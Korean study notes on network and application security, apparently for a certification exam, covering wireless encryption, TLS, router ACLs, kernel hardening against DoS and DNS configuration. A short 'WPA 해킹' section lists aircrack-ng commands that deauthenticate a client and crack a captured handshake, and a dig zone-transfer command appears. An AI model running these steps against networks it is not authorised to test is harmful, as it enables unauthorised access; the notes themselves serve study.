* 랜덤하게 생성되는 24bit 초기벡터(IV)와 고정된 40Bit(WEP-40) 또는 104Bit(WEP-104)의 WEP 공유키를 조합하여 WEP 암호키를 생성한 후 RC4 암호 알고리즘을 기반으로 한 난수발생기에 입력하여 스트림 암호를 위한 키스트림을 생성한다.
* 평문의 무결성을 보장하기 위해 CRC-32 알고리즘을 이용하여 무결성 체크값(ICV)을 생성한 후 평문과 조합하여 키스트림과 XOR 연산을 수행, 암호문을 생성한다.
* 무선 AP와 무선 단말기 사이에 사전에 서로 동일하게 설정된 공유키를 이용하여 인증과 데이터 암호화 기능을 제공하지만, 해당 무선랜을 사용하는 모든 장비(무선 AP와 무선 단말기)가 하나의 고정된 공유키를 사용하기 때문에 외부에 노출될 가능성이 크며 이를 통해 많은 보안 문제가 발생할 수 있다.
*  암호 알고리즘 : RC4
* WEP 암호 방식의 문제점
  1. 짧은 길이의 초기벡터 사용으로 IV 값 재사용
  2. 불완전한 RC4 알고리즘 사용으로 인한 암호키 노출
  3. 짧은 길이의 암호키 사용으로 인한 공격
  4. 암호키 노출로 인한 무선 전송 데이터 노출
  
### WPA
* WEP와 동일한 RC4 알고리즘을 기반으로 하며 48bit 확장된 IV를 사용하는 TKIP 암호화 방식을 사용한다.
* 암호 알고리즘 : RC4-TKIP

### WPA 2
* WPA와 키 관리의 유사성을 가지고 있지만 AES 기반의 128bit 대칭키를 사용하고 블록암호모드로 CCM 모드를 사용하는 CCMP 암호화 방식을 사용한다.
* EAP (Extensible Authentication Protocol) : 다양한 종류의 인증방식을 캡슐화해서 전송하는 역할을 하는 인증 프로토콜이다.
* 암호 알고리즘 : AES-CCMP

### SSID (Service Set Identifier)
* 무선랜을 구분하기 위한 32byte 이름으로 서로 다른 무선랜을 식별하기 위한 용도로 사용한다.
* 무선 장비에서 Wi-Fi를 활성화했을 때 나오는 무선랜 목록이 바로 SSID를 의미한다.
* 보안상의 목적으로 무선랜 접속을 제한하기 위해 와이파이 공유기에 설정하는 옵션으로 "SSID 브로드캐스트를 사용하지 않도록(disable)" 설정한다.

### NAT (Network Address Translation)
* 내부 네트워크에서 사용하는 사설IP(Private IP)와 인터넷에서 사용하는 공인 IP(Public IP) 간의 변환 기술을 말한다.
* 부족한 공인 IP를 절약할 수 있고, 외부에서 사설 IP를 사용하는 내부 호스트로 직접 접근이 불가능하므로 내부 네트워크(사설망)를 보호할 수 있는 보안상의 장점이 있다.
### 워 드라이빙
* 무선랜 해킹과 관련하여 해커가 무선 네트워크를 찾기 위해 무선 장치를 가지고 주위의 AP를 찾는 것
* 임의의 번호를 추출해 원하는 모뎀을 찾아냄으로써 컴퓨터에 대한 해킹을 시도하는 것이다.

### SSL / TLS
* 넷스케이프사가 처음으로 만들었으며 이 프로토콜은 신뢰할 수 있는 종단-대-종단의 안전한 서비스를 제공하기 위해 TCP를 이용하도록 설계하였으며, 인증 및 암호화 기능을 제공한다. 웹 브라우저와 웹서버 간에 서로 상대의 신원을 확인하는 기능이 있다.
* 443/tcp 포트를 사용한다.
* 인터펫기술표준화기구(IETF)에서 SSL을 기반으로 표준화한 TLS가 있으며, 무선환경에서는 WTLS가 사용된다.
* TLS 1.3 버전에서 강화된 보안과 빨라진 성능을 특징으로 하고 있다.
  * TLS 1.2 이하 버전에서는 최초 세션 연결 시 2-RTT를 거쳐야 했으나 TLS 1.3에서는 이과정을 1-RTT로 단축하여 성능 향상
  * 세션 재연결 시에도 TLS 1.2 이하 버전에서는 1-RTT을 거쳐야 했으나 TLS 1.3에서는 공유된 암호키를 로컬에 저장하여 바로 요청 메시지에 해당 키를 사용하는 방식의 0-RTT를 지원한다.
* SSL/TLS 취약성 이용한 공격
  * BEAST (Browser Exploit Against SSL?TLS) 공격 : 사용자 브라우저의 취약점을 이용하여 HTTPS 쿠키를 훔쳐서 HTTPS 세션을 가로챌 수 있는 공격
  * CRIME (Compression Ration Info-Mass Exploitation) 공격 : HTTPS의 압축에 따른 취약점을 이용하여 HTTPS 쿠키를 훔쳐서 HTTPS 세션을 가로챌 수 있는 공격
* Handshake 프로토콜 : 종단 간에 보안 파라미터를 협상하기 위한 프로토콜
  1. 협상 단계
  2. 서버 인증 및 키 교환
  3. 클라이언트 인증 및 키 교환
  4. 협상한 보안 파라미터를 적용하여 메시지 교환
* Change cipher spec 프로토콜 : 협상한 보안 파라미터를 이후부터 적용함을 알리기 위한 프로토콜
* Alert 프로토콜 : 통신 과정에서 발생하는 오류를 통보하기 위한 프로토콜
* Application Data 프로토콜 : 응용 계층의 데이터를 전달하기 위한 프로토콜
* Record 프로토콜 : 상위 계층 프로토콜 데이터의 전달 및 적용된 보안 파라미터를 이용하여 애플리케이션 데이터에 대한 단편화 및 재조합, 암호화 및 복호화, 압축 및 압축해제, 메시지 인증 코드(MAC) 생성 및 검증 등을 제공하는 프로토콜
  1. 단편화 : 애플리케이션 데이터를 일정 크기로 단편화한다.
  2. 압축 : 단편화된 데이터를 압축 알고리즘으로 압축한다.
  3. MAC : MAC 값을 계산하여 추가한다.
  4. 암호화 : 압축된 데이터와 MAC 값을 암호 알고리즘으로 암호화한 후 Record 헤더를 추가하여 전송한다.

### SSH (Secure Sheel)
* 인터넷에서 원격으로 호스트를 관리하는 안전한 암호통신 터미널 프로그램
* 한 컴퓨터에서 다른 컴퓨터로 파일을 옮김
* 안전하지 않은 채널 사이의 강력한 인증기능 제공
* rlogin, rsh, telnet, ftp와 같은 프로그램을 안전하게 대체
* 22번 포트를 사용한다.

### 라우터
* Unicast RPF (Receive Path Forwarding) 패킷 필터링 기법
  * 라우팅 테이블을 확인하여 출발지 주소, 목적지 주소가 있는지 확인하여 차단한다.
* 정적/동적 라우팅 개념
  * 정적 라우팅 : 관리자가 직접 라우팅 테이블을 설정하는 방식으로 관리자가 설정해준 경로로만 전달되기 때문에 정확하고 라우터 간의 정보 교환이 필요하지 않아 트래픽 낭비를 막을 수 있지만 규모가 큰 네트워크의 경우 관리의 어려움이 있다.
  * 동적 라우팅 : 라우팅 프로토콜을 이용하여 자동으로 경로를 탐색하고 패킷을 전달하는 방법으로 프로토콜 설정만 해주면 관리자가 일일이 경로를 설정해야 하는 수고를 덜 수 있다.
* 라우팅 프로토콜 분류
  * IGP (interior Gateway Protocol) : 자율 시스템(AS) 내부에서 사용하는 라우팅 프로토콜, 자율 시스템은 조직/기관 내부에서 직접 관리하는 라우터 집합을 말한다.
    * 거리 벡터 : RIP, RIPv2, IGRP
    * 링크 상태 : IS-IS, OSPF
    * 하이브리드 : EIGRP
  * EGP (Exterior Gateway Protocol) : 자율 시스템 간에 사용하는 라우팅 프로토콜
    * 경로 벡터 : BGP 
* Ingress 필터링 : Standard 또는 Extended Access-List를 활용하여 라우터 내부로 즉, 사내 네트워크로 유입되는 패킷의 출발지 IP 주소를 점검하여 허용 또는 거부하도록 하는 것이다.
* Egress 필터링 : 내부에서 라우터 외부로 나가는 패킷의 출발지 IP 주소를 검사하여 허용 또는 거부하도록 하는 것이다.
* 블랙홀 필터링 : 특정한 목적지 IP 주소 또는 IP 주소 대역에 대해서 null이라는 가상의 인터페이스로 보내도록 함으로써 패킷의 통신이 되지 않도록 하는 것이다.
* access-list rule
  * access-liust acl번호 [permit(허용) 또는 deny(차단)] 프로토콜 출발지 [출발지-wildcard] 목적지 [목적지-wildcard] [목적지 포트]
  * (예시 1) access-list 150 deny tcp 192.168.1.0 0.0.0.255 host 100.100.100.1 eq 80
    * 출발지 IP가 192.168.1.0/24 대역이고 목적지 IP가 100.100.100.1(특정 IP 지정 시 host 키워드 명시)이고 목적지 포트가 80(eq는 equal)인 TCP 패킷에 대해 모두 차단한다.
    * 모든 IP 주소를 명시할 경우 any 키워드 사용
  * (예시 2) access-list 150 deny udp host 192.168.2.5 100.100.100.0 0.0.0.255 range 100 200
    * 출발지 IP가 192.168.2.5이고 목적지 IP가 100.100.100.0/24 대역이고 목적지 목적지 포트가 100~200(range를 통해 포트 범위 지정)인 UDP 패킷에 대해 모두 차단한다.
  * (예시 3) (config) ip route 211.1.1.1 255.255.255.255 Null 0
    * Null 0 이라는 가상의 인터페이스로 211.1.1.1을 목적지로 하는 IP 패킷을 보낸다(블랙홀 필터링).
    * 단점이 있는데 Null 인터페이스로 보내질 때마다 최초 출발지로 패킷 차단에 따른 ICMP Unreachable 메시지를 발송하게 되는데, 만약 필터링하는 패킷이 많으면 라우터에 과부하를 유발할 수 있다. 이를 위해서 (config-if) # no ip unreachables
* Cisco IOS
  * en(enable) -> Privileged Mode 로 진입
  * enable secret "패스워드" -> Privileged Mode로 진입할 때 패스워드 설정
  * snmp-server community [String] ro 50 -> snmp-server를 활성화 하고 community string을 String으로 설정하고 read only ACL 50번을 적용
    * communiy String은 snmp-server 와 클라이언트가 데이터를 교환하기 전에 인증을 위해 사용하는 일종의 패스워드로, 초기값으로 public, private 설정되어 있다.
  * conf t(config terminal) -> config 모드 진입
  * int (인터페이스) -> 인터페이스 설정
  * ip access-group 150 in -> 인바운드에 150번 규칙 트래픽에 적용
  * logging on -> 로그 기능 활성화
  * logging trap debugging -> 로깅 수준을 디버깅 설정
  * logging 192.168.10.13. -> 로그를 남길 원격지 로그 서버의 IP를 192.168.10.13
  * line vty 0 : vty(virtual terminal) 포트는 원격지에서 텔넷 등을 접속하는 가상 터미널 포트
  * config terminal ->[config] no snmp-server (SNMP 서비스를 비활성화)
  * config terminal ->[config] interface FastEthernet 0/0 ->[config-if] no IP directed-broadcast (directed broadcast를 거부한다. 스머프, 여러 증폭/반사 를 방어)
  * access-list 100 permit udp 192.168.1.0 0.0.0.255 any -> 출발지 192.168.1.0/24 에서 오는 udp 패킷을 허용하고 acl 100번 저장
  * interface FastEthernet 0/0
  * ip directed-broadcast 100 -> 해당 인터페이스에 ip directed-broadcast 적용
  * access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 23 -> 23번 Telnet 에 192.168.1.0/24 대역에 오면 허용해주고 acl 100번 저장
  * access-list 100 permit udp host 192.168.2.5 any range 100 150
  * access-list 100 permit tcp any any eq 80
  * access-list 100 permit udp any any eq 53
  * access-list 100 permit tcp any any eq 53
  * access-list 100 deny ip any any
  * interface Serial 0
  * ip access-group 100 in
  * Access-List를 작성할 때 Permit을 항상 매 아래에 둔다.
  * service password-encryption -> 패스워드 암호화 활성화
  * enable secret -> 패스워드를 암호화해서 저장하기 위한 설정
  * enable password -> 패스워드를 평문으로 저장하기 위한 설정
  * conf t -> configuration terminal 설정
  * enable secret dkfrltk12#$ -> dkfrltk12#$ 로 패스워드 설정
  * logging on -> 로그 서비스 활성화
  * logging 192.168.0.10 -> 원격 로그 서버 192.168.0.10 지정정

### 네트워크 통신 스니핑을 탐지할 수 있는 다양한 방법
#### ICMP 스니핑을 탐지 방법 (PING)
* 의심스러운 호스트에 해당 네트워크에 존재하지 않는 MAC 주소로 위조한 ping(ICMP Echo Request 메시지)을 보내면 다음과 같은 결과를 확인할 수 있다.
* ICMP Echo Reply가 오는 경우 : 이 경우는 해당 호스트가 스니핑을 하는 것이다. 왜냐하면 존재하지 않는 MAC 주소로 ping을 했는데 무차별 모드로 스니핑을 하고 있지 않다면 이 요청을 볼 수 없기 때문이다.
* ICMP Echo Reply가 오지 않는 경우 : 이 경우는 해당 호스트가 요청 패킷을 정상적으로 폐기한 것이므로 스니핑을 하지 않는 정상적인 호스트이다.

#### ARP 스니핑 탐지 방법 
* ping과 유사한 방법으로 존재하지 않는 MAC 주소로 위조된 non-broadcast ARP Request를 보냈을 때 ARP Response가 오면 상대방 호스트가 무차별 모드로 설정되어 스니핑하고 있음을 확인할 수 있다.

#### DNS 스니핑 탐지 방법
* 일반적으로 스니핑 프로그램은 사용자의 편의를 위해 스니핑한 시스템의 IP 주소를 inverse(reverse) dns lookup을 수행한다. 따라서 대상 네트워크에 ping sweep을 보내고 들어오는 inverse lookup 패킷을 감사하여 스니퍼를 탐지한다. ping sweep은 해당 네트워크의 모든 호스트에게 ping을 날리는 방식을 의미한다. 

#### 유인(Decoy)을 이용한 방법
* 스니핑 공격의 주요 목적은 계정과 패스워드를 획득하는 것이다. 따라서 보안관리자는 가짜 계정과 패스워드를 네트워크에 계속 뿌린다. 공격자는 이 계정을 이용해 접속을 시도하는 시스템을 탐지함으로써 스니퍼를 탐지한다.

#### ARP watch
* 초기 MAC 주소와 IP 주소의 매칭값을 저장하고 ARP 트래픽을 모니터링하여 변화가 있는 ARP 패킷을 탐지하는 도구이다. 대부분의 스니핑 공격기법이 ARP Spoofing을 사용하기 떄문에 이를 탐지할 수 있다.

### CIDR (Classless InterDomain Routing)
* 기존의 클래스(A, B, C, D) 기반 주소 체계를 대체하여 클래스 구분 없이 IPv4 전체 bit에 대해 네트워크 ID 와 호스트 ID를 설정하는 주소 할당 방식이다.

### TCP 프로토콜
* 연결 설정 3-way handshake
  1. SYN 을 보낸다. (seq.Num =0, ack.Num)
  2. SYN+ACK 을 보낸다. (seq.Num=3, ack.Num=1)
  3. ACK 을 보낸다. (seq.Num=1, ack.Num=4)
* 연결 종료 4-way handshake
  1. ACK+FIN 을 보낸다. (seq.Num=1234, ACK.Num=6789)
  2. ACK 을 보낸다. (seq.Num=6789, ack.Num=1235)
  3. ACK+FIN 을 보낸다. (seq.Num=6789, ack.Num=1235)
  4. ACK 을 보낸다. (seq.Num=1235, ack.Num=6790 
* 제어 플래그
  * SYN : 연결 설정
  * FIN : 연결 종료
  * RST : 연결 중단
  * ACK : 정상 수신 응답
  * URG : 긴급 데이터로 설정하여 순서와 상관없이 긴급 처리
  * PSH : 수신 버퍼의 데이터를 상위 계층으로 즉시 전달

### TCP Syn Cookie
* TCP 표준에 명시된 클라이언트의 유효성을 확인하기 위한(클라이언트를 인증하기 위한) 기술이다.
* 클라이언트 SYN 요청에 대한 응답으로 SYN+ACK를 전송할 때 Sequence Number 필드에 ISN(Initial Sequence Number) 대신 알고리즘을 통해 생성한 Cookie 값을 설정하여 전송한다. 정상적인 클라이언트라면 SYN+ACK에 대한 응답에 Cookie +1 값을 Acknowledgment Number 필드에 설정하여 응답하게 된다. 응답에 포함된 Cookie 값을 검증하여 정상적인 클라이언트인지 판단하게 된다.
* 클라이언트의 유효성이 확인될 때까지 서버 측에서 'Backlog Queue(연결요청대기큐)'에 연결요청 정보를 저장하지 않기 때문에 TCP SYN Flooding 공격에 효과적으로 대응할 수 있다.
* 서버에 직접 TCP SYN Cookie 기능을 활성화하면 Cookie 생성 및 검증에 대한 부하가 크기 때문에 서버 앞단에 있는 별도의 장비(디도스 대응 장비, L4-Switch 등)를 이용하여 적용하는 경우가 일반적이다.
* SYN Cookie 생성 알고리즘 : 일반적으로 Local IP, Local Port, Foreign IP, Foreign Port, Timestamp 등 동일 클라이언트의 요청 여부를 식별할 수 있는 값을 조합 및 해시하여 32bit 해시값을 생성, SYN Cookie 값으로 사용한다.

* 유닉스/리눅스 Syn Cookie 커널 파라미터 설정하기(0: 미설정, 1: 설정)
  1. ```sysctl -w net.ipv4.tcp_syncookies=1```
  2. ```echo 1> /proc/sys/net/ipv4/tcp_syncookies``` 

### TCP/IP 커널 파라미터 보안 설정
#### 1) 개요
* sysctl 명령은 리눅스 커널 파라미터를 확인하거나 설정할 때 사용하는 명령어로 사용 방법은 다음과 같다.
  * 파라미터 확인 : ```sysctl -n <parameter>```를 통해 특정 파라미터를 확인하거나 ```sysctl -a``` 명령을 통해 현재 모든 커널 파라미터를 확인할 수 있다.
  * 파라미터 설정 : ```sysctl -w <parameter>=<value>```
* ndd 명령은 유닉스(솔라리스)의 네트워크 관련 커널 파라미터를 확인하거나 설정할 때 사용하는 명령어로 사용 방법은 다음과 같다.
  * 파라미터 확인 : ```ndd /dev/<driver> <parameter>```
  * 파라미터 설정 : ```ndd -set /dev/<driver> <parameter> <value>```
  * TCP/IP 커널에 대하여 <driver>는 ARP, IP, TCP, UDP가 해당한다.
#### 2) 스머프 공격 대응 설정
1. 개요
  * 스머프 공격은 출발지 IP를 공격대상 IP로 위조한 후 증폭 네트워크로 ICMP Echo Request 메시지를 브로드캐스트함으로써 대량의 ICMP Echo Reply 메시지가 공격대상에게 전달되어 서비스 거부를 유발시키는 공격기법을 말한다.
2. 공격 대응 방안
  * 증폭 네트워크로 사용되는 것을 막기 위해 **다른 네트워크로부터 자신의 네트워크로 들어오는 directed broadcast 패킷을 허용하지 않도록 라우터 설정**을 한다.
  * **브로드캐스트 주소로 전송된 ICMP Echo Request 메시지에 대해 응답하지 않도록 시스템 설정**을한다.
3. 리눅스 시스템 설정
  * ```sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1``` : 브로드캐스트 주소로 전송된 ICMP Echo Request 메시지 수신 시 이를 무시한다(1은 true를 의미).
4. 유닉스 시스템 설정
  * ```ndd -set /dev/ip ip_respond_to_echo_broadcast 0``` : 브로드캐스트 주소로 전송된 ICMP Echo Request 메시지 수신 시 응답하지 않는다(0은 false를 의미).
  * ```ndd -set /dev/ip ip_forward_directed_broadcast 0``` : directed broadcasts IP 패킷을 포워딩하지 않는다(0은 false를 의미).
#### 3) TCP SYN Flooding 공격 대응 설정
1. 개요
  * TCP SYN Flooding 공격은 출발지 IP 주소를 위조한(IP Spoofing) 다수의 SYN 패킷을 공격 대상 호스트로 전송하여 공격 대상 호스트의 TCP 연결 자원(Backlog Queue)을 모두 소진시켜 서비스 거부 상태를 유발시키는 공격을 말한다.
2. 공격 대응 방안
  * **시스템 설정을 통해 Backlog Queue(연결요청대기큐)의 크기를 늘린다.** Backlog Queue는 제한된 시스템 자원으로 무한정 크게 늘릴 수 없는 한계가 있다.
  * **보안장비(디도스 대응 장비, 방화벽 등)를 이용한 임계치 기반의 차단**을 수행한다.
  * **First SYN Drop 기능**을 이용한다.
  * **TCP SYN Cookie 기능**을 이용한다. TCP SYN Cookie 기능은 TCP 클라이언트의 유효성을 확인하기 위한 기능으로 클라이언트의 유효성이 확인될 때까지 서버 측에서 Backlog Queue에 연결요청 정보를 저장하지 않는 특성을 이용한 방어 기법이다.
3. 리눅스 시스템 설정
  * ```sysctl -w net.ipv4.tcp_max_syn_backlog=1024``` : TCP Backlog Queue의 크기를 늘린다(예, 1024)
  * ```sysctl -w net.ipv4.tcp_syncookies=1``` : TCP SYN Cookie 기능을 활성화한다(1은 true를 의미).
4. 유닉스(Solaris) 시스템 설정
  * ```ndd -set /dev/tcp tcp_conn_req_max_q0 1024``` : TCP Backlog Queue의 크기를 늘린다(예, 1024)

#### 4) ICMP Redirect 공격 대응 설정
1. 개요
  * ICMP Redirect 공격은 ICMP Redirect 메시지를 공격자가 원하는 형태로 만들어 특정 목적지로 가는 패킷을 공격자가 스니핑하는 기법이다.
2. 공격 대응 방안
  * ICMP Redirect 메시지 수신 시 이를 무시하고, ICMP Redirect 메시지를 전송하지 않도록 시스템(커널 파라미터) 설정을 한다.
3. 리눅스 시스템 설정
  * ```sysctl -w net.ipv4.conf.all.accept_redirects=0``` : ICMP Redirect 메시지 수신 시 라우팅 테이블 변경을 허용하지 않는다(0은 false를 의미).
  * ```sysctl -w net.ipv4.conf.default.send_redirect=0``` : ICMP Redirect 메시지를 전송하지 않는다(0은 false를 의미).
4. 유닉스(Solaris) 시스템 설정
  * ```ndd -set /dev/ip ip_ignore_redirect 1``` : ICMP Redirect 메시지 수신 시 라우팅 테이블을 변경하지 않고 무시한다(1은 true를 의미).
  * ```ndd -set /dev/ip ip_send_redirects 0``` : ICMP Redirect 메시지를 전송하지 않는다(0은 false를 의미).

#### 5) IP Source Routing 기능 비활성화
1. 개요
  * IP Source Routing 기능은 IP 옵션 헤더를 이용하여 호스트나 라우터에 설정된 라우팅 경로를 이용하지 않고 출발지에서 직접 경로를 지정하는 방식으로 외부에서 직접 접근이 불가능한 내부 시스템에 우회하여 접근할 수 있는 보안상 문제점이 있다.
2. 공격 대응 방안
  * IP Source Routing 기능을 이용하는 IP 패킷 수신 시 이를 허용하지 않도록 시스템(커널 파라미터) 설정을 한다.
3. 리눅스 시스템 설정
  * ```sysctl -w net.ipv4.conf.all.accept_source_route=0``` : 소스 라우팅 IP 패킷 수신 시 이를 허용하지 않는다(0은 false를 의미).
4. 유닉스(Solaris) 시스템 설정
  * ```ndd -set /dev/ip ip_forward_src_routed 0``` : 소스 라우팅 IP 패킷 수신 시 이를 포워딩 하지 않는다(0은 flase를 의미).
5. 라우터 설정
  * ```no ip source-route```

#### 6) IP Forwarding 기능 비활성화 설정
1. 개요
  * IP Forwarding 기능은 호스트가 라우터처럼 동작하여 자신이 목적지가 아닌 IP 패킷에 대해 라우팅 테이블을 참조하여 해당 목적지로 전송해주는 기능을 말한다.
  * IP Forwarding 기능이 설정되어 있으면 이를 악용하여 다른 서버로 패킷 전송이 가능하므로 라우터 역할을 하는 서버가 아니라면 IP Forwarding 기능을 비활성화하도록 시스템(커널 파라미터) 설정을 한다.
2. 리눅스 시스템 설정
  * ```sysctl -w net.ipv4.ip_forward=0``` : IP 포워딩 기능을 비활성화한다(0은 false를 의미).
3. 유닉스 시스템 설정
  * ```ndd -set /dev/ip ip_forwarding 0``` : IP 포워딩 기능을 비활성화한다(0은 false를 의미).

### 안전한 무선랜 구축을 위해 무선 AP에 적용할 보안 설정
1. 무선 AP의 도난 및 공격자의 접근으로부터 보호할 수 있도록 보호 케이스 설치, AP 리셋 버튼 차단 등 **물리적 보안대책**을 확보한다.
2. 무선 AP 관리자 모드 **접속 비밀번호를 설정**하고 주기적으로 변경하여 공격자가 AP 관리자 모드로 접속하는 것을 방지한다.
3. **SSID를 초기 설정값이 아닌 새로운 값으로 변경**하여 공격자가 쉽게 인지하지 못하도록 한다.
4. **SSID를 브로드캐스트하지 않고 숨김 모드로 설정**하여 공격자에게 노출되는 것을 최소화한다.
5. 공격자의 접속 방지 및 무선 구간에서의 데이터 기밀성과 무결성을 유지하기 위해 무선 AP에서 제공하는 **안전한 인증 및 암호화 방식을 적용**한다.
6. 무선 AP 접속을 허용할 무선 단말기 리스트를 등록하여(**MAC 필터링**) 임의 사용자 접근 차단.

### 무선랜 보안
#### MAC 기반 필터링
* MAC 주소를 구성하는 48비트(6바이트) 크게 두 부분으로 구성된다. 처음 3바이트는 제조사 식별자, 뒤에 3바이트는 제조사 부여 일련번호
* MAC Address Filtering : 무선랜 접속을 허용할 단말의 MAC 주소를 무선 AP에 사전 등록하여 인증
  * 장점 : 접근 제어 방식이 간단하고 기본적인 공격을 효과적으로 방어
  * 단점 : 정상 단말의 MAC 주소를 획득하면 쉽게 무력화
* MAC Address FIltering 보안 기능 우회 : 정상 사용자와 무선 AP 간의 트래픽을 분석하여 MAC 주소 획득하여 무선 AP 접속

### HTTP, Telnet
* HTTP를 사용하지 않고 HTTPS를 사용하고, Telnet을 사용하지 않고 SSH를 사용을 권장한다. 이유는 평문으로 통신을 하기 때문에 MITM(중간자 공격에)취약하다.
* HTTPS, SSH 는 암호화 하여 통신을 하기 때문에 기밀성을 보장

### promiscuous mode
* 무차별 모드로 목적지 주소와 무관하게 모든 패킷을 수신하는 동작 모드이다.
* ifconfig로 해결하려면 ```ifconfig eth0 -promisc``` 명령어를 주면 된다.
* 스니핑 모드를 로그를 보려면 /var/log/messages 를 확인하여 발생 시점을 찾는다.

### iptables
* ```iptables -A INPUT -p TCP --dport 80 --syn -m limit --limit 10/s -j ACCEPT``` 목적지 포트가 80번인 syn에 대해 1초에 10번 허용하고 이를 초과하면 차단
* ```iptables -A INPUT -p TCP --dport 80 --syn -j DROP```

### WPA 해킹
* ```airodump-ng -c 3 --bassid 00:18:E7:CC:C8:CF -w wpa mon0``` --bassid 00\:18\:E7\:CC\:C8\:CF 은 타겟 AP 주소
* ```aireplay-ng -0 1 -a 00:18:E7:CC:C8:CF -c BB:53:2E:01:03:04 mon0``` -c BB\:53\:2E\:01\:03\:04 은 타겟 AP 에 연결된 스테이션
* ```aircrack-ng -w pw.lst -b 00:18:E7:CC:C8:CF *.cap``` -w pw.lst 는 패스워드 크래킹 위한 사전 파일 -b 00\:18\:E7\:CC\:C8\:CF 는 타겟 AP의 맥주소

## 어플리케이션 보안
### DNS
* 도메인 이름과 IP를 변환하여 주는 거대한 분산 데이터베이스(네이밍) 시스템으로 해당 도메인에 대한 정보는 위임받은 서버의 Zone 파일에 저장된다.
* DNS 서비스는 53번 포트를 사용하고 tcp/udp 프로토콜을 사용하며 DNS 서버에 빈번하게 반복적인 질의를 요청하여 부하가 발생하는 것을 막기 위해 Cache를 사용하고 그 유효기간을 TTL이라고 한다.
* Cache DNS 서버 : DNS 질의에 응답 결과를 캐시에 일정 시간 저장하고 있다가 같은 DNS 질의가 오면 저장해 둔 정보를 이용하여 응답
* Authoritative DNS 서버 : 관리하는 도메인에 대해서만 응답해주는 DNS 서버
* /etc/named.conf -> version "unknown" : DNS 서버 설정 파일에서 버전 정보를 보여주지 않기 위해 설정
```
zone "관리 도메인 이름" IN {
  type master; // 마스터 네임서버 타입으로 지정
  file "도메인 이름.zone"; 도메인 존 파일 지정
  allow-transfer {IP}; 슬레이브 네임서버 IP를 설정하여 존 전송 허용
}
```
* 존 정보 : 해당 DNS 서버가 위임받은 도메인에 대한 리소스 레코드 정보를 말한다.
  * allow-transfer {IP} 옵션을 named.conf 설정파일에 추가하면 존 전송을 허용
```
named.conf 파일 설정
master 설정
zon "algisa.com" IN{
  type: master;                    // 마스터 네임서버 지정
  file: "algisa.com.zone";         // 존파일 주소 지정
  allow-transfer {192.168.2.53;};  // 슬레이브 네임서버 IP 설정하여 존 전송 허용
}
slave 설정
zon "algisa.com" IN{
  type: slave;              // 슬레이브 네임서버 지정
  masters: {192.168.1.53;};  // 마스터 네임서버의 IP를 지정하여 존 전송 요청하도록 함
  allow-transfer {none;};    // 슬레이브 네임서버는 존 전송을 허용하지 않도록 설정
}
```
  * 존 전송을 제한하지 않으면 공격자의 지속적인 존 전송 요청을 통해 DoS 공격으로 악용되거나 존 데이터에 저장된 해당 도메인의 호스트 정보, 시스템 정보 등이 불필요하게 노출된다.
* 존 전송 : 일반적으로 많은 존 데이터를 이동해야 하므로 신뢰성 있는 tcp/53번 포트를 사용
* 응답 데이터가 512byte를 초과할 때 tcp/53 포트 사용
* IP : 도메인 으로 hosts 파일에 저장된다.
* 존 설정 : 도메인을 DNS 서버에 등록
* 리소스 레코드 설정 : DNS 서버에 서비스 정보 입력
* 웹브라우저의 URL에 대한 DNS 질의는 다음과 같은 순위로 이루어진다.
  1. 로컬 시스템에 저장된 DNS Cache
  2. hosts.ics
  3. hosts
  4. DNS 서버 질의
* /etc/hosts 파일은 DNS 서버에 질의하기 전에 먼저 참조되는 파일이다. 파밍 공격을 통해 파밍 사이트로 접속하도록 hosts 파일을 변조하는 사례가 자주 보고된다.
* /etc/resolv.conf 시스템 기본 네임 서버 설정 정보를 담고 있는 파일
* ```ipconfig /displaydns``` -> dns cache 조회 명령어
* ```ipconfig /flushdns``` -> dns cache 초기화 명령어
* ```nslookup``` -> DNS 질의를 통해 DNS 서버로부터 여러 가지 정보를 얻을 수 있는 대표적인 명령어로 'nslookup', 'dig'이 있다.
* ```dig axfr @192.168.19.131 kiwi99.com``` 해당 도메인의 존 정보를 획득하는 명령어입니다. axfr
* CNAME : 동일 호스트에 대해 여러 서브 도메인을 운영하는 환경에서 IP 관리를 효율적으로 할 수 있다는 장점이 있다.
* **DNS Cache Poisoning** : 취약한 DNS 서버에 조작된 쿼리를 전송하여 DNS 서버가 저장하고 있는 주소 정보를 임의로 변조하는 공격
* **subdomain hijacking** : 회사의 DNS에 서브 도메인으로 웹 호스팅, 클라우드 등의 서비스를 CNAME 레코드로 등록하여 사용 후 서비스 이용을 중지했을 때, DNS 서브 도메인을 삭제하지 않으면 공격자가 해당 회사에서 사용했던 웹 호스팅, 클라우드 등의 서비스 도메인을 재사용하여 피싱 등의 악의적인 사이트를 해당 회사의 서브 도메인으로 운영할 수 있는 취약점을 말한다.
* **DNSSEC** : 데이터 위변조 공격에 취약한 DNS의 문제점을 근본적으로 해결하기 위해 IETF에 의해 2005년 완성된 국제표준기술로 기존의 DNS에 공개키 암호화 방식의 보안 기능을 추가하여 데이터 원천 인증과 무결성 등의 보안 서비스 제공

### HTTP
* HTTP 프로토콜은 클라이언트의 상태정보를 유지하지 않는(Stateless) 프로토콜이다.
* 쿠키 값은 클라이언트 저장
* 세션 값은 서버에 저장
* telnet 명령어를 통해 HTTP Method를 확인하는 방법은 OPTIONS Method를 사용한다.
* GET 메소드 : HTTP 요청 URL의 끝에 데이터를 추가해서 전달하는 방식
* POST 메소드 : 요쳉 메시지 바디부에 데이터를 담아서 전달하는 방식
* GET 메소드는 URL 끝에 데이터를 추가해서 전달하기 때문에 요청 URL 정보를 남기는 클라이언트 히스토리나 액세스 로그에 데이터가 노출되어 중요정보일 경우 보안상 매우 취약하다.
* POST 메소드는 요청 메시지 바디부에 데이터를 담아서 전달하기 때문에 클라이언트 히스토리나 서버의 access 로그에 데이터가 남지 않으므로 GET 방식에 비해 상대적으로 안전하다.
* HTTP 요청 헤더에서 Referer는 링크를 통해 페이지에 접근할 때 해당 링크가 있는 이전 페이지의 URL을 의미한다. 즉, A라는 페이지에서 링크를 클릭해서 B라는 페이지에 접근하게 되면 A라는 페이지가 Referer가 된다. Cache-Control의 max-age=0 옵션의 의미는 캐시 서버에 저장된 요청 자원의 유효성 유무와 무관하게 원본 웹서버로 유효성을 검증을 다시 하라는 의미이다. 캐시 서버에 저장된 자원이 웹서버에 저장된 자원과 일치하는지를 확인하는 것
* Cache-Control 요청 헤더에 max-age=0 옵션을 설정하여 캐시 서버가 항상 원본 웹서버에 요청자원에 대한 유효성을 검증하도록 하여 캐시 서버를 무력화시키고 원본 웹서버에 부하를 발생하는 공격이다.
|상세 코드|설명|
|:-:|:-|
|200|OK|
